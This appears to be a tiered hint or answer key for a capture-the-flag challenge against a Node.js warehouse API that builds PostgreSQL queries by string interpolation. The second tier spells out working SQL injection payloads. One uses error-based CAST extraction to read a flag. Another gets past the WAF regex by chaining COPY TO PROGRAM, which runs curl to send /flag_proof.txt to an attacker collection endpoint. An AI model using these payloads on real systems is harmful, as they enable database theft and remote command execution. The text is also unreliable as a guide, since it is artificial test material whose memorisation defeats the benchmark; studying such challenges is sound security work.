tier1: This Node.js service exposes a warehouse API that accepts a source identifier and queries a PostgreSQL backend to check for pending staging events. The query is assembled by string interpolation, and the response includes any database error messages verbatim. A middleware component inspects incoming request bodies and enforces a single WAF rule that matches a specific pattern: a quote character followed by optional whitespace and a semicolon at the start of the remaining string. The database user has elevated PostgreSQL privileges.
tier2: Send a POST to /v1/warehouse/pending-events with JSON body {"source_id": "..."}. The source_id value is interpolated directly into a SQL SELECT statement with no parameterization. The WAF middleware checks each string field against the regex ^(?:[^']*'|[^"]*"|[^`]*`)[\s\v]*; — it blocks payloads where a quote is immediately followed by optional whitespace and a semicolon. To read FLAG_LOCAL from the flags table, use error-based extraction: ' AND 1=CAST((SELECT flag_value FROM flags LIMIT 1) AS INTEGER) -- - This payload contains a quote but no semicolon at all, so the WAF does not match. The server returns the flag value inside a Postgres cast error message. For FLAG_PROOF, you need COPY TO PROGRAM which requires a standalone statement after a semicolon — the WAF blocks payloads like ' ; COPY .... Bypass by inserting a SQL condition between the quote and the semicolon so the regex anchor fails to match: ' or 1=2; COPY (SELECT 'a') TO PROGRAM 'curl -g http://127.0.0.1:5000/attacker/collect?data=$(cat /flag_proof.txt)' -- - Use curl -g (--globoff) to prevent curl from interpreting curly braces in the flag value as URL globs. The /api/attacker/results endpoint returns all collected data.
